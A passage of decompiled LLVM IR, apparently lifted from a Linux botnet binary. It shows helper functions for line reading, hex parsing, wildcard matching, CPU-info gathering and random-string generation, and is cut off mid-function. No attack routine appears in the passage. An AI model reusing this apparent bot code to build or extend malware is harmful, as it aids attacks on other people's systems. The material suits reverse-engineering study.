dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_80614a0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd55 = ptrtoint i8* %arg1 to i32
  %v2_8048cd86 = load i8, i8* %arg1, align 1
  %v4_8048cda10 = icmp eq i8 %v2_8048cd86, 0
  br i1 %v4_8048cda10, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.011, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.012, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8058180.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd513, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd513 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd55, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp14, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp14, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp14, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp14, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.9 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.9, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048d71 ], [ %storemerge5, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e5a = load i32, i32* @ebp, align 4
  store i32 %v0_8048e5a, i32* %stack_var_-4, align 4
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  %v2_8048e8b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v2_8048e8b = phi i32 [ %v2_8048e8b.pre, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v0_8048e5a, %entry ]
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  store i32 %v2_8048e8b, i32* @ebp, align 4
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ea1 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058580.18, i32 0, i32 0), i32 0)
  %v2_8048fff = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804901137 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_804901938 = icmp eq i32 %v5_804901137, 0
  %v1_804901b39 = icmp eq i1 %v1_804901938, false
  br i1 %v1_804901b39, label %dec_label_pc_8048eb1.lr.ph, label %dec_label_pc_8049021

dec_label_pc_8048eb1.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8048eb1

dec_label_pc_8048eb1:                             ; preds = %dec_label_pc_8048eb1.lr.ph, %dec_label_pc_8048fe3
  %v3_8048ebb = call i32 @uppercase(i8* %tmp34)
  %v5_8048ed2 = call i32 @strstr(i32 %v2_8048fff, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805858e.19, i32 0, i32 0))
  %v12_8048ee2 = icmp eq i32 %v5_8048ed2, %v2_8048fff
  %v1_8048ee4 = icmp eq i1 %v12_8048ee2, false
  br i1 %v1_8048ee4, label %dec_label_pc_8048fe3, label %dec_label_pc_8048eea

dec_label_pc_8048eea:                             ; preds = %dec_label_pc_8048eb1
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f04, %dec_label_pc_8048efb
  %v5_8048ef8 = add i32 %v4_8048efb, 1
  %v22_8048ef8 = inttoptr i32 %v5_8048ef8 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048efb:                             ; preds = %dec_label_pc_8048eea, %dec_label_pc_8048ef8
  %storemerge4 = phi i8* [ %v22_8048ef8, %dec_label_pc_8048ef8 ], [ %tmp35, %dec_label_pc_8048eea ]
  %v4_8048efb = ptrtoint i8* %storemerge4 to i32
  %v2_8048efe = load i8, i8* %storemerge4, align 1
  %v7_8048f00 = icmp eq i8 %v2_8048efe, 32
  br i1 %v7_8048f00, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f04

dec_label_pc_8048f04:                             ; preds = %dec_label_pc_8048efb
  %v2_8048f07 = load i8, i8* %storemerge4, align 1
  %v10_8048f09 = icmp eq i8 %v2_8048f07, 9
  br i1 %v10_8048f09, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f0d

dec_label_pc_8048f0d:                             ; preds = %dec_label_pc_8048f04
  %v2_8048f10 = load i8, i8* %storemerge4, align 1
  %v10_8048f12 = icmp eq i8 %v2_8048f10, 58
  br i1 %v10_8048f12, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f3d

dec_label_pc_8048f18:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f3d
  %v3_8048f2f = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f36 = add i32 %v4_8048efb, %v3_8048f2f
  %v1_8048f39 = add i32 %v6_8048f36, -1
  %v1_8048f3a = inttoptr i32 %v1_8048f39 to i8*
  store i8 0, i8* %v1_8048f3a, align 1
  br label %dec_label_pc_8048f3d

dec_label_pc_8048f3d:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f18
  %v3_8048f54 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f5b = add i32 %v4_8048efb, %v3_8048f54
  %v1_8048f5e = add i32 %v6_8048f5b, -1
  %v1_8048f5f = inttoptr i32 %v1_8048f5e to i8*
  %v2_8048f5f = load i8, i8* %v1_8048f5f, align 1
  %v10_8048f61 = icmp eq i8 %v2_8048f5f, 13
  br i1 %v10_8048f61, label %dec_label_pc_8048f18, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f3d
  store i1 false, i1* @df, align 1
  store i32 %v4_8048efb, i32* @edi, align 4
  %v3_8048f7c = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f83 = add i32 %v4_8048efb, %v3_8048f7c
  %v1_8048f86 = add i32 %v6_8048f83, -1
  %v1_8048f87 = inttoptr i32 %v1_8048f86 to i8*
  %v2_8048f87 = load i8, i8* %v1_8048f87, align 1
  %v10_8048f89 = icmp eq i8 %v2_8048f87, 10
  br i1 %v10_8048f89, label %dec_label_pc_8048f18, label %dec_label_pc_8048f8d

dec_label_pc_8048f8d:                             ; preds = %dec_label_pc_8048f65
  %v5_8048f96 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8048f9e = icmp eq i32 %v5_8048f96, 0
  br i1 %v1_8048f9e, label %dec_label_pc_8048fb6, label %dec_label_pc_8048fa2

dec_label_pc_8048fa2:                             ; preds = %dec_label_pc_8048f8d
  %v5_8048fab = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8048fab = inttoptr i32 %v5_8048fab to i8*
  store i8 0, i8* %v6_8048fab, align 1
  br label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048f8d, %dec_label_pc_8048fa2
  store i32 %v4_8048efb, i32* @eax, align 4
  %v5_8048fc0 = inttoptr i32 %arg1 to i8*
  %v5_8048fc1 = call i32 @strcpy(i8* %v5_8048fc0, i32 %v4_8048efb)
  %v2_8048fcf = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8048fe3:                             ; preds = %dec_label_pc_8048eb1
  %v6_8048ff7 = call i32 @__GI_memset(i8* %tmp34, i32 0, i32 4096)
  %v5_8049011 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_8049019 = icmp eq i32 %v5_8049011, 0
  %v1_804901b = icmp eq i1 %v1_8049019, false
  br i1 %v1_804901b, label %dec_label_pc_8048eb1, label %dec_label_pc_8049021

dec_label_pc_8049021:                             ; preds = %dec_label_pc_8048fe3, %entry
  %v2_8049027 = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8048fb6, %dec_label_pc_8049021
  %storemerge = phi i32 [ 1, %dec_label_pc_8049021 ], [ 0, %dec_label_pc_8048fb6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048efb, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8048fff, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048ea1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8049039, { 1, 0 }
  uselistorder label %dec_label_pc_8048fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8048f3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048efb, { 1, 0 }
  uselistorder label %dec_label_pc_8048eb1, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %v5_804905e = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058580.18, i32 0, i32 0), i32 0)
  %v2_80490bf = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_80490d117 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d918 = icmp eq i32 %v5_80490d117, 0
  %v1_80490db19 = icmp eq i1 %v1_80490d918, false
  br i1 %v1_80490db19, label %dec_label_pc_804906b.lr.ph, label %dec_label_pc_80490dd

dec_label_pc_804906b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804906b

dec_label_pc_804906b:                             ; preds = %dec_label_pc_804906b.lr.ph, %dec_label_pc_804906b
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_804906b.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v3_8049075 = call i32 @uppercase(i8* %tmp16)
  %v5_804908c = call i32 @strstr(i32 %v2_80490bf, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805858e.19, i32 0, i32 0))
  %v12_804909c = icmp eq i32 %v5_804908c, %v2_80490bf
  %v4_80490a0 = zext i1 %v12_804909c to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_80490a0
  %v6_80490b7 = call i32 @__GI_memset(i8* %tmp16, i32 0, i32 4096)
  %v5_80490d1 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d9 = icmp eq i32 %v5_80490d1, 0
  %v1_80490db = icmp eq i1 %v1_80490d9, false
  br i1 %v1_80490db, label %dec_label_pc_804906b, label %dec_label_pc_80490dd

dec_label_pc_80490dd:                             ; preds = %dec_label_pc_804906b, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v2_80490e3 = call i32 @__libc_close(i32 %v5_804905e)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_80490bf, { 3, 1, 2, 0 }
  uselistorder i32 %v5_804905e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804906b, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80490f0 = load i32, i32* @ebp, align 4
  store i32 %v0_80490f0, i32* %stack_var_-4, align 4
  %v0_80490f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80490f4, i32* %stack_var_-12, align 4
  %v5_804910d = ptrtoint i8* %arg1 to i32
  %v5_804914e21 = icmp sgt i32 %arg2, 0
  br i1 %v5_804914e21, label %dec_label_pc_8049108, label %dec_label_pc_8049150

dec_label_pc_8049108:                             ; preds = %entry, %dec_label_pc_8049108
  %storemerge22 = phi i32 [ %v4_8049145, %dec_label_pc_8049108 ], [ 0, %entry ]
  %v6_804910d = add i32 %storemerge22, %v5_804910d
  store i32 %v6_804910d, i32* @ebx, align 4
  %v1_8049110 = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_8049110, i32* @ecx, align 4
  %v2_8049120 = udiv i32 %v1_8049110, 26
  %tmp = mul i32 %v2_8049120, -10
  %v2_8049138 = add i32 %v1_8049110, %tmp
  %v1_8049140 = add i32 %v2_8049138, 65
  %v11_8049140 = trunc i32 %v1_8049140 to i8
  %v2_8049143 = load i32, i32* @ebx, align 4
  %v3_8049143 = inttoptr i32 %v2_8049143 to i8*
  store i8 %v11_8049140, i8* %v3_8049143, align 1
  %v4_8049145 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_8049145, %arg2
  br i1 %exitcond, label %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, label %dec_label_pc_8049108

dec_label_pc_8049148.dec_label_pc_8049150_crit_edge: ; preds = %dec_label_pc_8049108
  %v2_8049153.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8049155.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049150

dec_label_pc_8049150:                             ; preds = %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, %entry
  %v2_8049155 = phi i32 [ %v2_8049155.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f0, %entry ]
  %v2_8049153 = phi i32 [ %v2_8049153.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049153, i32* @ebx, align 4
  store i32 %v2_8049155, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8049145, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049108, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804915a = load i32, i32* @edi, align 4
  store i32 %v0_804915a, i32* %stack_var_-8, align 4
  %v1_8049167 = inttoptr i32 %tmp19 to i8*
  %v1_804916c = and i32 %tmp19, -256
  store i32 %v1_804916c, i32* %eax.global-to-local, align 4
  %v5_804916e = call i8* @_memset(i8* %v1_8049167, i32 %v1_804916c, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804918e = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049195 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_80491a2 = udiv i32 %tmp15, 32
